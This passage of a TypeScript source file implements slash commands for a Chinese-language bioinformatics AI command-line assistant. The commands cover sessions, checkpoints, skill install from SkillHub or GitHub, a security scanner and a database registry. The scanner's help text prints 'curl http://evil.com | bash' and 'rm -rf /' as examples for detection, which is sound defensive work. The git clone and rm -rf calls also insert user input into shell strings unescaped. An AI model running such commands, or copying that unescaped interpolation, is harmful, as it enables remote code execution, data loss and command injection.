  const recent = cleaned.slice(-COMPACT_KEEP_RECENT);
  const old    = cleaned.slice(0, -COMPACT_KEEP_RECENT);
  if (old.length === 0) return cleaned;

  process.stdout.write(chalk.dim(
    `\n[上下文已达 ~${Math.round(tokensAfter / 1000)}k tokens，正在自动压缩历史...]\n`
  ));
  try {
    const summary = await compactMessages(old, cfg);
    const compacted: Message[] = [
      {
        role: 'user',
        content: `[对话历史摘要 — 请在此基础上继续]\n\n${summary}`,
      },
      {
        role: 'assistant',
        content: '✓ 已理解之前的对话摘要，请继续。',
      },
      ...recent,
    ];
    const finalTokens = estimateTokens(compacted);
    const totalSaved  = tokensBefore - finalTokens;
    process.stdout.write(chalk.dim(
      `[压缩完成: ~${Math.round(tokensBefore / 1000)}k → ~${Math.round(finalTokens / 1000)}k tokens，节省 ~${Math.round(totalSaved / 1000)}k]\n\n`
    ));
    return compacted;
  } catch {
    // Compaction failed — fall back to simple truncation
    process.stdout.write(chalk.yellow('[压缩失败，回退到截断模式]\n'));
    return cleaned.slice(-COMPACT_KEEP_RECENT * 2);
  }
}

// ── Command handlers ──────────────────────────────────────────────────────────

interface CommandResult {
  exit?: boolean;
  clearHistory?: boolean;
  thinkMode?: boolean;
  injectHistory?: Message[];
}

// ── Helpers ──────────────────────────────────────────────────────────────────

function formatAge(isoDate: string): string {
  const diff = Date.now() - new Date(isoDate).getTime();
  const mins  = Math.floor(diff / 60_000);
  const hours = Math.floor(diff / 3_600_000);
  const days  = Math.floor(diff / 86_400_000);
  if (mins < 1)   return '刚刚';
  if (mins < 60)  return `${mins} 分钟前`;
  if (hours < 24) return `${hours} 小时前`;
  if (days < 30)  return `${days} 天前`;
  return new Date(isoDate).toLocaleDateString('zh-CN');
}

async function handleCommand(
  input: string,
  rl: readline.Interface,
  history: Message[],
  thinkMode: boolean,
  injectedSkills: Map<string, string>,  // id → name
): Promise<CommandResult> {
  const [cmd, ...rest] = input.slice(1).trim().split(/\s+/);
  const arg = rest.join(' ');
  const cfg = loadConfig();

  switch (cmd?.toLowerCase()) {
    case 'provider': {
      if (!arg) {
        console.log('用法: /provider <deepseek|kimi|qwen|minimax|intranet|custom>');
        break;
      }
      if (!PROVIDERS[arg]) {
        console.log(chalk.red(`未知服务商: ${arg}`));
        console.log('可用:', Object.keys(PROVIDERS).join(', '));
        break;
      }
      if (arg === 'custom') {
        await setupCustomProvider(rl);
        break;
      }
      cfg.provider = arg as string;
      cfg.model = PROVIDERS[arg].defaultModel;
      saveConfig(cfg);
      console.log(chalk.green(`✓ 切换到 ${PROVIDERS[arg].name}，模型: ${cfg.model}`));
      break;
    }

    case 'model': {
      if (!arg) {
        console.log('用法: /model <model-name>');
        break;
      }
      cfg.model = arg;
      saveConfig(cfg);
      console.log(chalk.green(`✓ 切换到模型: ${arg}`));
      break;
    }

    case 'models': {
      const prov = PROVIDERS[cfg.provider];
      console.log(chalk.bold(`${prov.name} 可用模型:`));
      prov.models.forEach((m) => {
        const current = m === cfg.model ? chalk.green(' ← 当前') : '';
        console.log(`  ${m}${current}`);
      });
      break;
    }

    case 'providers': {
      console.log(chalk.bold('可用服务商:'));
      Object.entries(PROVIDERS).forEach(([key, p]) => {
        const current = key === cfg.provider ? chalk.green(' ← 当前') : '';
        const noKey = p.envKey === '' ? chalk.dim(' (无需 Key)') : '';
        console.log(`  ${chalk.cyan(key)}: ${p.name}${noKey}${current}`);
      });
      break;
    }

    case 'connect': {
      const provKey = arg || cfg.provider;
      if (!PROVIDERS[provKey]) {
        console.log(chalk.red(`未知服务商: ${provKey}`));
        break;
      }
      if (provKey === 'custom') {
        await setupCustomProvider(rl);
        break;
      }
      const apiKey = await setupApiKey(rl, provKey);
      if (apiKey) {
        cfg.apiKeys[provKey] = apiKey;
        if (!arg) {
          cfg.provider = provKey;
          cfg.model = PROVIDERS[provKey].defaultModel;
        }
        saveConfig(cfg);
        console.log(chalk.green(`✓ API Key 已保存`));
      }
      break;
    }

    case 'status': {
      const prov = PROVIDERS[cfg.provider];
      const hasKey = prov?.envKey === '' || !!(cfg.apiKeys[cfg.provider] || (prov?.envKey && process.env[prov.envKey]));
      console.log(chalk.bold('当前配置:'));
      console.log(`  服务商:   ${prov?.name ?? cfg.provider}`);
      console.log(`  模型:     ${cfg.model}`);
      console.log(`  API Key:  ${hasKey ? chalk.green('已配置') : chalk.red('未配置')}`);
      console.log(`  工作目录: ${process.cwd()}`);
      console.log(`  思考模式: ${thinkMode ? chalk.yellow('开启 (/think)') : chalk.dim('关闭')}`);
      break;
    }

    case 'clear':
      console.log(chalk.dim('对话历史已清空'));
      return { clearHistory: true };

    case 'history': {
      const turns     = Math.floor(history.length / 2);
      const estTokens = estimateTokens(history);
      const pct       = Math.round((estTokens / COMPACT_TOKEN_THRESHOLD) * 100);
      const bar       = '█'.repeat(Math.min(20, Math.round(pct / 5))) +
                        '░'.repeat(Math.max(0, 20 - Math.round(pct / 5)));
      console.log(chalk.bold('对话统计:'));
      console.log(`  轮次:        ${turns}`);
      console.log(`  消息总数:    ${history.length}`);
      console.log(`  估算 Token:  ~${estTokens.toLocaleString()}`);
      console.log(`  上下文用量:  [${pct >= 80 ? chalk.red(bar) : pct >= 50 ? chalk.yellow(bar) : chalk.green(bar)}] ${pct}%`);
      console.log(`  压缩阈值:    ~${Math.round(COMPACT_TOKEN_THRESHOLD / 1000)}k tokens`);
      if (pct >= 80) console.log(chalk.yellow('  ⚠ 接近上限，建议运行 /compact'));
      break;
    }

    case 'save': {
      saveConversation(history, arg || undefined);
      break;
    }

    // ── Session persistence ──────────────────────────────────────────────────
    case 'sessions': {
      const sessions = listSessions();
      if (sessions.length === 0) {
        console.log(chalk.dim('暂无历史会话。对话结束后会自动保存。'));
        break;
      }
      console.log(chalk.bold(`\n历史会话 (${sessions.length} 个):\n`));
      sessions.slice(0, 20).forEach((s, i) => {
        const age = formatAge(s.updatedAt);
        const skills = s.skills.length > 0 ? chalk.dim(` [${s.skills.join(', ')}]`) : '';
        const preview = s.preview ? chalk.dim(` — "${s.preview.slice(0, 40)}${s.preview.length > 40 ? '…' : ''}"`) : '';
        const marker = i === 0 ? chalk.green('●') : chalk.dim('○');
        console.log(`  ${marker} ${chalk.cyan(s.id)}  ${chalk.dim(age)}${skills}`);
        if (preview) console.log(`      ${preview}`);
      });
      console.log();
      console.log(chalk.dim('使用 /resume [id] 恢复会话  /session-del <id> 删除'));
      break;
    }

    case 'resume': {
      let targetId = arg;
      if (!targetId) {
        const last = getLastSession();
        if (!last) {
          console.log(chalk.yellow('暂无历史会话'));
          break;
        }
        targetId = last.id;
        console.log(chalk.dim(`恢复最近会话: ${targetId}`));
      }
      const session = loadSession(targetId);
      if (!session) {
        // Try partial match
        const all = listSessions();
        const match = all.find((s) => s.id.includes(targetId!));
        if (!match) {
          console.log(chalk.red(`未找到会话: ${targetId}`));
          break;
        }
        const s2 = loadSession(match.id);
        if (!s2) { console.log(chalk.red('加载失败')); break; }
        console.log(chalk.green(`✓ 已恢复会话 ${s2.id} (${s2.messageCount} 条消息)`));
        if (s2.skills.length > 0) console.log(chalk.dim(`  已加载 Skills: ${s2.skills.join(', ')}`));
        // Restore skills map
        for (const sk of s2.skills) injectedSkills.set(sk, sk);
        return { injectHistory: s2.messages };
      }
      console.log(chalk.green(`✓ 已恢复会话 ${session.id} (${session.messageCount} 条消息)`));
      if (session.skills.length > 0) console.log(chalk.dim(`  已加载 Skills: ${session.skills.join(', ')}`));
      for (const sk of session.skills) injectedSkills.set(sk, sk);
      return { injectHistory: session.messages };
    }

    case 'session-save': {
      const sessionId = SESSION_CTX.id || undefined;
      if (!sessionId) { console.log(chalk.yellow('当前会话尚未初始化')); break; }
      const name = arg || new Date().toLocaleString('zh-CN');
      saveSession(sessionId, name, history, Array.from(injectedSkills.keys()), SESSION_CTX.createdAt || new Date().toISOString());
      console.log(chalk.green(`✓ 会话已保存: ${sessionId}  名称: "${name}"`));
      break;
    }

    case 'session-del': {
      if (!arg) { console.log('用法: /session-del <id>'); break; }
      const ok = deleteSession(arg);
      console.log(ok ? chalk.green(`✓ 已删除会话: ${arg}`) : chalk.yellow(`未找到会话: ${arg}`));
      break;
    }

    // ── Checkpoints ──────────────────────────────────────────────────────────
    case 'checkpoint': {
      const sessionId = SESSION_CTX.id || 'default';
      const sub = arg.split(/\s+/)[0]?.toLowerCase();
      const subArg = arg.split(/\s+/).slice(1).join(' ');

      if (!sub || sub === 'save' || sub === '') {
        // Save checkpoint
        const label = subArg || `第 ${Math.floor(history.length / 2)} 轮`;
        const cpId = saveCheckpoint(sessionId, label, history, Array.from(injectedSkills.keys()));
        console.log(chalk.green(`✓ 断点已保存: ${cpId}  标签: "${label}"`));
      } else if (sub === 'list') {
        const cps = listCheckpoints(sessionId);
        if (cps.length === 0) {
          console.log(chalk.dim('当前会话暂无断点'));
        } else {
          console.log(chalk.bold(`\n当前会话断点 (${cps.length} 个):\n`));
          cps.forEach((cp) => {
            const age = formatAge(cp.createdAt);
            console.log(`  ${chalk.cyan(cp.id.split('-cp')[1] ?? cp.id)}  ${chalk.dim(age)}  "${cp.label}"  (${cp.messageCount} 条消息)`);
            console.log(chalk.dim(`    /checkpoint restore ${cp.id}`));
          });
        }
      } else if (sub === 'restore') {
        if (!subArg) { console.log('用法: /checkpoint restore <id>'); break; }
        // Support short ID (just the timestamp part)
        const cps = listCheckpoints(sessionId);
        const target = cps.find((cp) => cp.id === subArg || cp.id.endsWith(subArg));
        if (!target) { console.log(chalk.red(`未找到断点: ${subArg}`)); break; }
        console.log(chalk.green(`✓ 已恢复到断点: "${target.label}" (${target.messageCount} 条消息)`));
        injectedSkills.clear();
        for (const sk of target.skills) injectedSkills.set(sk, sk);
        return { injectHistory: target.messages };
      } else if (sub === 'clear') {
        const n = clearCheckpoints(sessionId);
        console.log(chalk.green(`✓ 已清除 ${n} 个断点`));
      } else {
        console.log('用法: /checkpoint [list|restore <id>|clear]');
      }
      break;
    }

    // ── Workdir diff ─────────────────────────────────────────────────────────
    case 'diff': {
      const snap = SESSION_CTX.wdirSnapshot ?? undefined;
      if (!snap) {
        console.log(chalk.dim('工作目录快照尚未建立（会话开始时自动创建）'));
        break;
      }
      const current = snapshotWorkdir(process.cwd());
      const { added, modified } = diffWorkdir(snap, current);
      if (added.length === 0 && modified.length === 0) {
        console.log(chalk.dim('本次会话未产生新文件或修改'));
      } else {
        if (added.length > 0) {
          console.log(chalk.bold.green(`\n新增文件 (${added.length} 个):`));
          added.forEach((f) => console.log(`  ${chalk.green('+')} ${f}`));
        }
        if (modified.length > 0) {
          console.log(chalk.bold.yellow(`\n修改文件 (${modified.length} 个):`));
          modified.forEach((f) => console.log(`  ${chalk.yellow('~')} ${f}`));
        }
        console.log();
      }
      break;
    }

    // ── /run workflow wizard ─────────────────────────────────────────────────
    case 'run': {
      const targetId = arg;
      if (!targetId) {
        console.log('用法: /run <skill-id>');
        console.log(chalk.dim('示例: /run deseq2-analysis  /run survival-analysis-clinical'));
        break;
      }
      const allSkillsRun = collectAllSkills();
      const runMatch = allSkillsRun.find((e) => e.id === targetId || e.id.startsWith(targetId) || e.id.includes(targetId));
      if (!runMatch) {
        console.log(chalk.red(`未找到 Skill: ${targetId}`));
        break;
      }
      const skillPath = join(runMatch.dir, runMatch.id, 'SKILL.md');
      if (!existsSync(skillPath)) {
        console.log(chalk.red(`${runMatch.id} 缺少 SKILL.md`));
        break;
      }
      const skillContent = readFileSync(skillPath, 'utf8');
      const { name: skillName } = parseSkillMeta(skillContent);

      // Extract required-params section from SKILL.md
      const paramsMatch = skillContent.match(/##\s*(?:必要参数|Required Parameters|参数)[\s\S]*?(?=\n##|$)/i);
      const paramsSection = paramsMatch?.[0] ?? '';

      // Ask LLM to extract parameter list
      console.log(chalk.bold.cyan(`\n─── /run ${runMatch.id} 向导 ─────────────────────────────`));
      console.log(chalk.dim(`  Skill: ${skillName || runMatch.id}`));
      console.log(chalk.dim('  请回答以下问题，AI 将自动生成并执行分析脚本\n'));

      // Simple parameter extraction: look for bullet points or numbered items in params section
      const paramLines = paramsSection
        .split('\n')
        .filter((l) => /^[-*•]|^\d+\./.test(l.trim()))
        .map((l) => l.replace(/^[-*•\d.]+\s*/, '').trim())
        .filter(Boolean)
        .slice(0, 8);

      // If no params found in SKILL.md, use generic questions
      const questions = paramLines.length > 0 ? paramLines : [
        '数据文件路径（支持相对路径，如 ./data/counts.csv）',
        '样本分组信息（如 treatment,treatment,control,control）',
        '对照组名称',
        '实验组名称',
        '输出目录（默认: ./results）',
      ];

      const answers: Record<string, string> = {};
      for (const q of questions) {
        const ans = await question(rl, chalk.blue(`  ${q}: `));
        if (ans.trim()) answers[q] = ans.trim();
      }

      // Build prompt for LLM to generate analysis script
      const paramSummary = Object.entries(answers)
        .map(([k, v]) => `- ${k}: ${v}`)
        .join('\n');

      const runPrompt = `请根据以下参数，使用 ${skillName || runMatch.id} 工作流生成完整的分析脚本并立即执行：

用户提供的参数：
${paramSummary}

请：
1. 生成完整可运行的分析脚本（R 或 Python）
2. 使用 bash 工具执行脚本
3. 分析完成后给出结果摘要`;

      // Ensure skill is loaded
      if (!injectedSkills.has(runMatch.id)) {
        await injectSkill(runMatch.id, history, injectedSkills, rl, true);
      }

      history.push({ role: 'user', content: runPrompt });
      console.log(chalk.dim('\n  正在生成并执行分析脚本...\n'));
      try {
        const runCfg = loadConfig();
        const reply = await chat(history, runCfg, systemPrompt);
        history.push({ role: 'assistant', content: reply });
      } catch (err) {
        console.error(chalk.red(`执行失败: ${err instanceof Error ? err.message : String(err)}`));
        history.pop();
      }
      break;
    }

    // ── /check-env ───────────────────────────────────────────────────────────
    case 'check-env': {
      const checkId = arg;
      const skillsToCheck = checkId
        ? (() => {
            const all = collectAllSkills();
            const m = all.find((e) => e.id === checkId || e.id.startsWith(checkId) || e.id.includes(checkId));
            return m ? [m] : [];
          })()
        : collectAllSkills().filter((e) => injectedSkills.has(e.id));

      if (skillsToCheck.length === 0) {
        console.log(chalk.yellow(checkId ? `未找到 Skill: ${checkId}` : '当前会话未加载任何 Skill'));
        break;
      }

      for (const entry of skillsToCheck) {
        const sp = join(entry.dir, entry.id, 'SKILL.md');
        if (!existsSync(sp)) continue;
        const content = readFileSync(sp, 'utf8');
        const { name } = parseSkillMeta(content);
        console.log(chalk.bold(`\n检测 ${name || entry.id} 的依赖环境:`));

        // Extract R packages
        const rPkgs = [...new Set([
          ...(content.match(/library\(([\w.]+)\)/g) ?? []).map((m) => m.replace(/library\(|\)/g, '')),
          ...(content.match(/require\(([\w.]+)\)/g) ?? []).map((m) => m.replace(/require\(|\)/g, '')),
          ...(content.match(/BiocManager::install\("([^"]+)"\)/g) ?? []).map((m) => m.replace(/BiocManager::install\("|"\)/g, '')),
        ])];

        // Extract Python packages
        const pyPkgs = [...new Set([
          ...(content.match(/import (\w+)/g) ?? []).map((m) => m.replace('import ', '')),
          ...(content.match(/from (\w+) import/g) ?? []).map((m) => m.replace('from ', '').replace(' import', '')),
        ])];

        if (rPkgs.length > 0) {
          console.log(chalk.dim(`  R 包 (${rPkgs.length} 个): ${rPkgs.join(', ')}`));
          // Check each R package
          const checkScript = rPkgs.map((p) =>
            `cat(sprintf("  %-30s %s\\n", "${p}", if(requireNamespace("${p}", quietly=TRUE)) "✓ 已安装" else "✗ 未安装"))`
          ).join('\n');
          const result = await executeTool('bash', { command: `Rscript -e '${checkScript}'` });
          if (result.error) {
            console.log(chalk.dim('  (R 未安装或不可用)'));
          } else {
            console.log(result.output);
            // Show install command for missing packages
            const missing = rPkgs.filter((p) => result.output.includes(`${p}`) && result.output.includes('✗'));
            if (missing.length > 0) {
              console.log(chalk.yellow(`  缺少 ${missing.length} 个 R 包，安装命令:`));
              console.log(chalk.cyan(`  !Rscript -e 'install.packages(c(${missing.map((p) => `"${p}"`).join(', ')}))'`));
              const biocPkgs = missing.filter((p) => ['DESeq2','edgeR','limma','clusterProfiler','Seurat','SingleCellExperiment','BiocGenerics'].includes(p));
              if (biocPkgs.length > 0) {
                console.log(chalk.cyan(`  !Rscript -e 'BiocManager::install(c(${biocPkgs.map((p) => `"${p}"`).join(', ')}))'`));
              }
            }
          }
        }

        if (pyPkgs.length > 0) {
          const commonPy = ['numpy','pandas','scipy','sklearn','matplotlib','seaborn','scanpy','anndata','torch'];
          const relevantPy = pyPkgs.filter((p) => commonPy.includes(p));
          if (relevantPy.length > 0) {
            console.log(chalk.dim(`  Python 包 (${relevantPy.length} 个): ${relevantPy.join(', ')}`));
            const checkPy = relevantPy.map((p) =>
              `python3 -c "import ${p}; print('  %-30s ✓ 已安装' % '${p}')" 2>/dev/null || echo "  ${p.padEnd(30)} ✗ 未安装"`
            ).join(' && ');
            const result = await executeTool('bash', { command: checkPy });
            if (!result.error) console.log(result.output);
          }
        }

        if (rPkgs.length === 0 && pyPkgs.length === 0) {
          console.log(chalk.dim('  未检测到明确的包依赖声明'));
        }
      }
      break;
    }

    // ── /search SkillHub ─────────────────────────────────────────────────────
    case 'search': {
      if (!arg) {
        console.log('用法: /search <关键词> [--hub=bgi|clawhub|tencent]');
        console.log(chalk.dim('示例: /search rnaseq'));
        console.log(chalk.dim('      /search 蛋白质结构预测 --hub=tencent'));
        console.log(chalk.dim('      /search genomics --hub=clawhub'));
        console.log(chalk.dim('\n默认搜索 BGI 内网 SkillHub (http://172.16.218.40:8080)'));
        break;
      }
      // Parse --hub flag
      let hubKey: HubKey = 'bgi';
      const hubMatch = arg.match(/--hub=(\w+)/);
      const query = arg.replace(/--hub=\w+/g, '').trim();
      if (hubMatch) {
        const hk = hubMatch[1] as HubKey;
        if (hk in SKILLHUB_HUBS) hubKey = hk;
        else { console.log(chalk.red(`未知 hub: ${hubMatch[1]}，可选: bgi, clawhub, tencent`)); break; }
      }
      if (!query) { console.log(chalk.yellow('请提供搜索关键词')); break; }

      const hubLabel = SKILLHUB_HUBS[hubKey].label;
      process.stdout.write(chalk.dim(`正在搜索 ${hubLabel} SkillHub: "${query}"...\n`));
      try {
        const results = await searchSkillHub(query, hubKey, 10);
        if (results.length === 0) {
          console.log(chalk.yellow(`  未找到相关 Skill，请尝试其他关键词`));
          break;
        }
        _lastSearchResults = results;
        console.log(chalk.bold(`\n  搜索结果 (${hubLabel}) — 共 ${results.length} 个:\n`));
        results.forEach((s, i) => {
          const ver = s.version ? chalk.dim(` v${s.version}`) : '';
          const owner = s.owner ? chalk.dim(` @${s.owner}`) : '';
          console.log(`  ${chalk.cyan(`[${i + 1}]`)} ${chalk.bold(s.name)}${owner}${ver}`);
          console.log(`      ${chalk.dim(s.summary.substring(0, 90))}${s.summary.length > 90 ? '…' : ''}`);
          console.log(`      ${chalk.dim(`slug: ${s.slug}`)}`);
          console.log();
        });
        console.log(chalk.dim(`安装: /install <slug>  或  /install <序号>  (如: /install 1)`));
      } catch (e) {
        console.log(chalk.red(`搜索失败: ${e instanceof Error ? e.message : String(e)}`));
      }
      break;
    }

    // ── /install from GitHub or SkillHub ──────────────────────────────────────
    case 'install': {
      if (!arg) {
        console.log('用法: /install <github-url | slug | 搜索序号>');
        console.log(chalk.dim('示例: /install https://github.com/user/my-skill'));
        console.log(chalk.dim('      /install user/repo       (GitHub 简写)'));
        console.log(chalk.dim('      /install personal-genomics (SkillHub slug)'));
        console.log(chalk.dim('      /install 2               (搜索结果序号)'));
        break;
      }
      // Check if arg is a search result number → resolve to slug
      let installArg = arg;
      const searchNum = /^\d+$/.test(installArg) ? parseInt(installArg, 10) : 0;
      if (searchNum > 0 && _lastSearchResults.length > 0) {
        if (searchNum > _lastSearchResults.length) {
          console.log(chalk.red(`序号 ${searchNum} 超出范围（共 ${_lastSearchResults.length} 个结果）`));
          break;
        }
        const picked = _lastSearchResults[searchNum - 1];
        console.log(chalk.dim(`从搜索结果安装: ${picked.name} (${picked.slug})`));
        installArg = picked.slug;
      }

      // Detect SkillHub slug (no slash, no http, not github.com-like two-part path)
      // A plain slug like "personal-genomics" → download from clawhub.ai API
      // A github-like "user/repo" or "https://..." → git clone
      const isGitHub = installArg.includes('github.com') || installArg.includes('gitlab') ||
                       installArg.includes('bitbucket') || /^[^/]+\/[^/]+$/.test(installArg);

      if (!isGitHub && !installArg.startsWith('http')) {
        // ── SkillHub slug install ────────────────────────────────────────────
        const slug = installArg.trim();
        const installTarget = join(SKILLS_DIR, slug);
        if (existsSync(installTarget)) {
          console.log(chalk.yellow(`Skill "${slug}" 已存在，如需更新请先 /uninstall ${slug}`));
          break;
        }
        process.stdout.write(chalk.dim(`正在从 SkillHub 下载 Skill: ${slug}...\n`));
        try {
          const skillMdContent = await downloadSkillMd(slug);
          // Security scan before install
          const skillScan = scanSkillMd(skillMdContent);
          if (skillScan.criticalCount > 0) {
            console.log(chalk.red(`\n⛔ 安全扫描发现 ${skillScan.criticalCount} 个 CRITICAL 风险，已拒绝安装`));
            console.log(chalk.dim(`   使用 /scan 命令检查具体内容`));
            break;
          }
          mkdirSync(installTarget, { recursive: true });
          writeFileSync(join(installTarget, 'SKILL.md'), skillMdContent, 'utf8');
          const { name, shortDesc } = parseSkillMeta(skillMdContent);
          console.log(chalk.green(`✓ SkillHub Skill 安装成功!`));
          console.log(`  ID:    ${chalk.cyan(slug)}`);
          console.log(`  名称:  ${name || slug}`);
          if (shortDesc) console.log(`  功能:  ${chalk.dim(shortDesc)}`);
          if (skillScan.highCount > 0) console.log(chalk.yellow(`  ⚠ 包含 ${skillScan.highCount} 个 HIGH 风险命令，请确认来源可信`));
          console.log(chalk.dim(`  使用 /sk ${slug} 加载`));
        } catch (e) {
          const msg = e instanceof Error ? e.message : String(e);
          if (msg === 'not_found') {
            console.log(chalk.red(`SkillHub 未找到 "${slug}"，请先用 /search 搜索确认 slug`));
          } else {
            console.log(chalk.red(`下载失败: ${msg}`));
          }
        }
        break;
      }

      // ── GitHub / git clone install ───────────────────────────────────────
      let repoUrl = installArg;
      if (!repoUrl.startsWith('http')) {
        repoUrl = `https://github.com/${repoUrl}`;
      }
      // Extract repo name as skill ID
      const repoName = repoUrl.replace(/\.git$/, '').split('/').pop() ?? 'unknown-skill';
      const installTarget = join(SKILLS_DIR, repoName);

      if (existsSync(installTarget)) {
        console.log(chalk.yellow(`Skill "${repoName}" 已存在，如需更新请先 /uninstall ${repoName}`));
        break;
      }

      console.log(chalk.dim(`正在从 GitHub 安装 Skill: ${repoName}...`));
      const cloneResult = await executeTool('bash', {
        command: `git clone --depth 1 "${repoUrl}" "${installTarget}" 2>&1`,
      });

      if (cloneResult.error || cloneResult.output.includes('fatal:')) {
        console.log(chalk.red(`安装失败: ${cloneResult.output || cloneResult.error}`));
        break;
      }

      // Validate SKILL.md exists
      const skillMdPath = join(installTarget, 'SKILL.md');
      if (!existsSync(skillMdPath)) {
        console.log(chalk.red(`安装失败: ${repoName} 缺少 SKILL.md 文件`));
        await executeTool('bash', { command: `rm -rf "${installTarget}"` });
        break;
      }

      const content = readFileSync(skillMdPath, 'utf8');
      const { name, shortDesc } = parseSkillMeta(content);
      console.log(chalk.green(`✓ Skill 安装成功!`));
      console.log(`  ID:    ${chalk.cyan(repoName)}`);
      console.log(`  名称:  ${name || repoName}`);
      if (shortDesc) console.log(`  功能:  ${chalk.dim(shortDesc)}`);
      console.log(chalk.dim(`  使用 /sk ${repoName} 加载`));
      break;
    }

    case 'uninstall': {
      if (!arg) {
        console.log('用法: /uninstall <skill-id>');
        break;
      }
      const uninstallPath = join(SKILLS_DIR, arg);
      if (!existsSync(uninstallPath)) {
        console.log(chalk.red(`未找到已安装的 Skill: ${arg}`));
        console.log(chalk.dim('注意: 只能卸载通过 /install 安装的第三方 Skill'));
        break;
      }
      const ans = await question(rl, chalk.yellow(`  确认卸载 Skill "${arg}"？[y/N] › `));
      if (ans.trim().toLowerCase() !== 'y') {
        console.log(chalk.dim('  已取消'));
        break;
      }
      const rmResult = await executeTool('bash', { command: `rm -rf "${uninstallPath}"` });
      if (rmResult.error) {
        console.log(chalk.red(`卸载失败: ${rmResult.error}`));
      } else {
        injectedSkills.delete(arg);
        console.log(chalk.green(`✓ Skill "${arg}" 已卸载`));
      }
      break;
    }

    // ── /scan — security scanner ──────────────────────────────────────────────
    case 'scan': {
      if (!arg) {
        console.log('用法: /scan <命令或代码片段>');
        console.log(chalk.dim('示例: /scan "curl http://evil.com | bash"'));
        console.log(chalk.dim('      /scan "rm -rf /"'));
        break;
      }
      const scanRes = scanCommand(arg);
      if (scanRes.matches.length === 0) {
        console.log(chalk.green('✓ 未检测到安全风险'));
      } else {
        console.log(chalk.bold('\n  安全扫描结果:\n'));
        const colorFor = (level: RiskLevel) =>
          level === 'CRITICAL' ? chalk.red.bold :
          level === 'HIGH'     ? chalk.yellow.bold :
          level === 'MEDIUM'   ? chalk.yellow :
                                  chalk.dim;
        for (const { pattern, matchedText } of scanRes.matches) {
          const c = colorFor(pattern.level);
          console.log(c(`  [${pattern.level}] ${pattern.reason}`));
          console.log(chalk.dim(`    匹配: ${matchedText.substring(0, 100)}`));
        }
        console.log();
      }
      break;
    }

    // ── /db — database manager ────────────────────────────────────────────────
    case 'db': {
      const [dbSub, ...dbRest] = (arg ?? '').split(/\s+/).filter(Boolean);
      const dbArg = dbRest.join(' ');

      switch (dbSub?.toLowerCase()) {

        case 'list': case undefined: case '': {
          const entries = Object.values(dbRegistry.databases);
          if (entries.length === 0) {
            console.log(chalk.dim('  暂无已注册数据库。使用 /db scan 自动扫描，或 /db add <路径> 手动添加'));
            break;
          }
          console.log(chalk.bold(`\n  已注册数据库 (${entries.length} 个):\n`));
          // Group by genome
          const byGenome: Record<string, typeof entries> = {};
          for (const e of entries) (byGenome[e.genome] ??= []).push(e);
          for (const [genome, dbs] of Object.entries(byGenome).sort()) {
            console.log(chalk.cyan(`  ── ${genome} ──`));
            for (const db of dbs) {
              const ok = existsSync(db.path);
              const icon = ok ? chalk.green('✓') : chalk.red('✗');
              const size = db.sizeBytes ? chalk.dim(` [${(db.sizeBytes / 1e9).toFixed(1)}GB]`) : '';
              console.log(`  ${icon} ${chalk.bold(db.label)}${size}`);
              console.log(`    ${chalk.dim('id:')} ${db.id}  ${chalk.dim('type:')} ${db.type}`);
              console.log(`    ${chalk.dim(db.path)}`);
            }
            console.log();
          }
          break;
        }

        case 'add': {
          // /db add <path> [genome] [type] [label...]
          if (!dbArg) {
            console.log('用法: /db add <路径> [基因组] [类型] [说明]');
            console.log(chalk.dim('示例: /db add /data/ref/hg38.fa hg38 fasta'));
            console.log(chalk.dim('      /db add /data/index/hg38_star hg38 star_index STAR比对索引'));
            break;
          }
          const parts = dbArg.trim().split(/\s+/);
          const dbPath = resolve(parts[0]);
          if (!existsSync(dbPath)) {
            console.log(chalk.yellow(`⚠ 路径不存在: ${dbPath}（仍会记录，路径可稍后创建）`));
          }
          const genome = parts[1] ?? 'other';
          const type = (parts[2] ?? 'other') as DatabaseEntry['type'];
          const label = parts.slice(3).join(' ') || `${type} (${genome})`;
          const entry = addDbEntry(dbRegistry, { label, type, genome, path: dbPath, source: 'manual' });
          saveDbRegistry(dbRegistry);
          systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
          console.log(chalk.green(`✓ 已添加数据库: ${entry.label}`));
          console.log(`  id: ${chalk.cyan(entry.id)}`);
          console.log(`  路径: ${chalk.dim(entry.path)}`);
          break;
        }

        case 'rm': case 'remove': case 'del': {
          if (!dbArg) { console.log('用法: /db rm <id>'); break; }
          const removed = removeDbEntry(dbRegistry, dbArg.trim());
          if (removed) {
            saveDbRegistry(dbRegistry);
            systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
            console.log(chalk.green(`✓ 已移除数据库: ${dbArg}`));
          } else {
            console.log(chalk.red(`未找到数据库 id: ${dbArg}，使用 /db list 查看已注册列表`));
          }
          break;
        }

        case 'scan': {
          const extraDirs = dbArg ? [dbArg] : [];
          process.stdout.write(chalk.dim('\n  正在扫描文件系统中的参考数据库...\n'));
          const report = scanForDatabases(extraDirs);
          if (report.found.length === 0) {
            console.log(chalk.yellow('  未找到任何已知数据库文件'));
            console.log(chalk.dim('  提示: 可指定目录 /db scan /your/data/dir'));
            break;
          }
          console.log(chalk.bold(`\n  扫描发现 ${report.found.length} 个数据库文件:\n`));
          let addedCount = 0;
          for (const entry of report.found) {
            const exists = dbRegistry.databases[entry.id];
            if (exists) {
              console.log(chalk.dim(`  [已存在] ${entry.label}`));
              continue;
            }
            dbRegistry.databases[entry.id] = entry;
            addedCount++;
            const size = entry.sizeBytes ? chalk.dim(` [${(entry.sizeBytes / 1e9).toFixed(1)}GB]`) : '';
            console.log(chalk.green(`  [新增] `) + `${entry.label}${size}`);
            console.log(chalk.dim(`         ${entry.path}`));
          }
          if (addedCount > 0) {
            dbRegistry.lastScan = new Date().toISOString();
            saveDbRegistry(dbRegistry);
            systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
            console.log(chalk.green(`\n  ✓ 新增 ${addedCount} 个数据库到注册表`));
          } else {
            console.log(chalk.dim('\n  无新增（所有已在注册表中）'));
          }
          break;
        }

        case 'download': case 'dl': {
          const target = dbArg.trim() || '';
          if (!target) {
            console.log(chalk.bold('\n  可下载的标准数据库:\n'));
            for (const [key, guide] of Object.entries(DOWNLOAD_GUIDES)) {
              console.log(`  ${chalk.cyan(key.padEnd(18))} ${guide.label}`);
            }
            console.log(chalk.dim('\n  用法: /db download hg38-fasta'));
            break;
          }
          const guide = DOWNLOAD_GUIDES[target];
          if (!guide) {
            console.log(chalk.red(`未知数据库: ${target}`));
            console.log(chalk.dim('使用 /db download 查看可用列表'));
            break;
          }
          console.log(chalk.bold(`\n  下载指南: ${guide.label}\n`));
          guide.cmds.forEach(cmd => console.log(`  ${chalk.cyan('$')} ${cmd}`));
